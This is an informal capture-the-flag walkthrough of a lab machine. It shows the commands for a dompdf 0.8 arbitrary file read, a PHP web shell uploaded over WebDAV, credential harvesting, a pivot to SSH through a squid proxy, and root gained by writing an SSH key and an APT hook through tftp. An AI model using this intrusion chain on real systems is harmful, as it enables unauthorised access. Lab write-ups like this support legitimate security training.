we look at site sorece code and found ==dom pdf== 0.8 vuln

```
curl http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd
```

by which we can read files rce

so we found some creds in ==/etc/apache2/sites-enabled/000-default.conf==

and a hidden directory

the name of the user was like web_dav so we did cadaver and we can upload all files in it

we uploaded ==qsd-php basckdoor from /usr/share/webshell==

we can jump to any directory comforbaly thats why

and found ==wp-config== with creds ..

on doing netstat -tulpn we found ssh 22 internally

so we edited ==/etc/proxychains4 to  http 10.10.10.67 3128 ==  #squid proxy

and did proxycahins4 ssh cobb@127.0.0.1

and logged in

now as root we didnot have root flag..

we did ==nc -zv== to check all the ports open on ip

we did ping on different ip chnaging the last digit and found 198.0.0.1 open with 3 ports

tftpd,and ssh

using tftpd we can upload anything on root

we used it to get crontab from /etc/crontab and found out a crontab runs every 5 mins

```
ssh-keygen
tftp 192.168.0.1
put id_rsa.pub /root/.ssh/authorized_keys
```

now crontab siad  ==apt-upgrade==

```
echo 'APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};' > rootshell
tftp 192.168.0.1
put rootshell /etc/apt/apt.conf.d/rootshell
```

and we can log in as root using id_rsa
